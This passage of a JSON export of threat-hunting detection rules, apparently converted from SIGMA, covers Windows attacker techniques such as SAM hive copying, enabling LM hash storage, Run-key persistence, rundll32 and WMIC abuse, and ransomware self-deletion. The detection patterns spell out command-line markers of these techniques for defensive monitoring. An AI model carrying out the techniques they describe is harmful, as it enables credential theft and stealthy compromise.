            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of the \"Trace log generation tool for Media Foundation Tools\" (Mftrace.exe) which can abused to execute arbitrary binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potential Mftrace.EXE Abuse",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\mftrace.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 476
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Enable LM Hash Storage - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\\Lsa\" and tgt.process.cmdline contains \"NoLMHash\" and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 477
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell scripts accessing SAM hives",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "PowerShell SAM Copy",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\HarddiskVolumeShadowCopy\" and tgt.process.cmdline contains \"System32\\config\\sam\") and (tgt.process.cmdline contains \"Copy-Item\" or tgt.process.cmdline contains \"cp $_.\" or tgt.process.cmdline contains \"cpi $_.\" or tgt.process.cmdline contains \"copy $_.\" or tgt.process.cmdline contains \".File]::Copy(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 478
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a potentially suspicious execution from an uncommon folder.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Process Execution From A Potentially Suspicious Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \":\\Perflogs\\\" or tgt.process.image.path contains \":\\Users\\All Users\\\" or tgt.process.image.path contains \":\\Users\\Default\\\" or tgt.process.image.path contains \":\\Users\\NetworkService\\\" or tgt.process.image.path contains \":\\Windows\\addins\\\" or tgt.process.image.path contains \":\\Windows\\debug\\\" or tgt.process.image.path contains \":\\Windows\\Fonts\\\" or tgt.process.image.path contains \":\\Windows\\Help\\\" or tgt.process.image.path contains \":\\Windows\\IME\\\" or tgt.process.image.path contains \":\\Windows\\Media\\\" or tgt.process.image.path contains \":\\Windows\\repair\\\" or tgt.process.image.path contains \":\\Windows\\security\\\" or tgt.process.image.path contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.image.path contains \":\\Windows\\Tasks\\\" or tgt.process.image.path contains \"$Recycle.bin\" or tgt.process.image.path contains \"\\config\\systemprofile\\\" or tgt.process.image.path contains \"\\Intel\\Logs\\\" or tgt.process.image.path contains \"\\RSA\\MachineKeys\\\") and (not (tgt.process.image.path contains \"C:\\Users\\Public\\IBM\\ClientSolutions\\Start_Programs\\\" or (tgt.process.image.path contains \"C:\\Windows\\SysWOW64\\config\\systemprofile\\Citrix\\UpdaterBinaries\\\" and tgt.process.image.path contains \"\\CitrixReceiverUpdater.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 479
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Suspicious ZipExec Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"/generic:Microsoft_Windows_Shell_ZipFolder:filename=\" and tgt.process.cmdline contains \".zip\" and tgt.process.cmdline contains \"/pass:\" and tgt.process.cmdline contains \"/user:\") or (tgt.process.cmdline contains \"/delete\" and tgt.process.cmdline contains \"Microsoft_Windows_Shell_ZipFolder:filename=\" and tgt.process.cmdline contains \".zip\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 480
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"Diskshadow.exe\". This could be an attempt to bypass parent/child relationship detection or application whitelisting rules.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Child Process Of DiskShadow.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\diskshadow.exe\" and (tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 481
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Tor or Tor-Browser to connect to onion routing networks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "Tor Client/Browser Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\tor.exe\" or tgt.process.image.path contains \"\\Tor Browser\\Browser\\firefox.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 482
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of \"GoogleUpdate.exe\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious GoogleUpdate Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\GoogleUpdate.exe\" and (not ((tgt.process.image.path contains \"\\Google\" or (tgt.process.image.path contains \"\\setup.exe\" or tgt.process.image.path contains \"chrome_updater.exe\" or tgt.process.image.path contains \"chrome_installer.exe\")) or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 483
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Vsls-Agent Command With AgentExtensionPath Load",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\vsls-agent.exe\" and tgt.process.cmdline contains \"--agentExtensionPath\") and (not tgt.process.cmdline contains \"Microsoft.VisualStudio.LiveShare.Agent.\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 484
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1033"
            ],
            "name": "WhoAmI as Parameter",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \".exe whoami\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 485
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a new service (kernel driver) with the type \"kernel\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1543"
            ],
            "name": "New Kernel Driver Via SC.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.cmdline contains \"create\" or tgt.process.cmdline contains \"config\") and (tgt.process.cmdline contains \"binPath\" and tgt.process.cmdline contains \"type\" and tgt.process.cmdline contains \"kernel\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 486
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"aspnet_compiler.exe\" with potentially suspicious paths for compilation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potentially Suspicious ASP.NET Compilation Via AspNetCompiler",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework\\\" or tgt.process.image.path contains \"C:\\Windows\\Microsoft.NET\\Framework64\\\") and tgt.process.image.path contains \"\\aspnet_compiler.exe\" and (tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Roaming\\\" or tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \":\\Windows\\System32\\Tasks\\\" or tgt.process.cmdline contains \":\\Windows\\Tasks\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 487
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070"
            ],
            "name": "Suspicious Ping/Del Command Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -n \" or tgt.process.cmdline contains \" /n \" or tgt.process.cmdline contains \" \u2013n \" or tgt.process.cmdline contains \" \u2014n \" or tgt.process.cmdline contains \" \u2015n \") and tgt.process.cmdline contains \"Nul\" and (tgt.process.cmdline contains \" -f \" or tgt.process.cmdline contains \" /f \" or tgt.process.cmdline contains \" \u2013f \" or tgt.process.cmdline contains \" \u2014f \" or tgt.process.cmdline contains \" \u2015f \" or tgt.process.cmdline contains \" -q \" or tgt.process.cmdline contains \" /q \" or tgt.process.cmdline contains \" \u2013q \" or tgt.process.cmdline contains \" \u2014q \" or tgt.process.cmdline contains \" \u2015q \") and (tgt.process.cmdline contains \"ping\" and tgt.process.cmdline contains \"del \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 488
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of WMIC with the \"format\" flag to potentially load XSL files.\nAdversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.\nExtensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1220"
            ],
            "name": "XSL Script Execution Via WMIC.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"-format\" or tgt.process.cmdline contains \"/format\" or tgt.process.cmdline contains \"\u2013format\" or tgt.process.cmdline contains \"\u2014format\" or tgt.process.cmdline contains \"\u2015format\")) and (not (tgt.process.cmdline contains \"Format:List\" or tgt.process.cmdline contains \"Format:htable\" or tgt.process.cmdline contains \"Format:hform\" or tgt.process.cmdline contains \"Format:table\" or tgt.process.cmdline contains \"Format:mof\" or tgt.process.cmdline contains \"Format:value\" or tgt.process.cmdline contains \"Format:rawxml\" or tgt.process.cmdline contains \"Format:xml\" or tgt.process.cmdline contains \"Format:csv\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 489
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command line reg.exe tool adding key to RUN key in Registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1547"
            ],
            "name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \" ADD \" and tgt.process.cmdline contains \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 490
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Potentially Suspicious Rundll32 Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"javascript:\" and tgt.process.cmdline contains \".RegisterXLL\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"OpenURLA\") or (tgt.process.cmdline contains \"url.dll\" and tgt.process.cmdline contains \"FileProtocolHandler\") or (tgt.process.cmdline contains \"zipfldr.dll\" and tgt.process.cmdline contains \"RouteTheCall\") or (tgt.process.cmdline contains \"shell32.dll\" and tgt.process.cmdline contains \"Control_RunDLL\") or (tgt.process.cmdline contains \"shell32.dll\" and tgt.process.cmdline contains \"ShellExec_RunDLL\") or (tgt.process.cmdline contains \"mshtml.dll\" and tgt.process.cmdline contains \"PrintHTML\") or (tgt.process.cmdline contains \"advpack.dll\" and tgt.process.cmdline contains \"LaunchINFSection\") or (tgt.process.cmdline contains \"advpack.dll\" and tgt.process.cmdline contains \"RegisterOCX\") or (tgt.process.cmdline contains \"ieadvpack.dll\" and tgt.process.cmdline contains \"LaunchINFSection\") or (tgt.process.cmdline contains \"ieadvpack.dll\" and tgt.process.cmdline contains \"RegisterOCX\") or (tgt.process.cmdline contains \"ieframe.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"shdocvw.dll\" and tgt.process.cmdline contains \"OpenURL\") or (tgt.process.cmdline contains \"syssetup.dll\" and tgt.process.cmdline contains \"SetupInfObjectInstallAction\") or (tgt.process.cmdline contains \"setupapi.dll\" and tgt.process.cmdline contains \"InstallHinfSection\") or (tgt.process.cmdline contains \"pcwutl.dll\" and tgt.process.cmdline contains \"LaunchApplication\") or (tgt.process.cmdline contains \"dfshim.dll\" and tgt.process.cmdline contains \"ShOpenVerbApplication\") or (tgt.process.cmdline contains \"dfshim.dll\" and 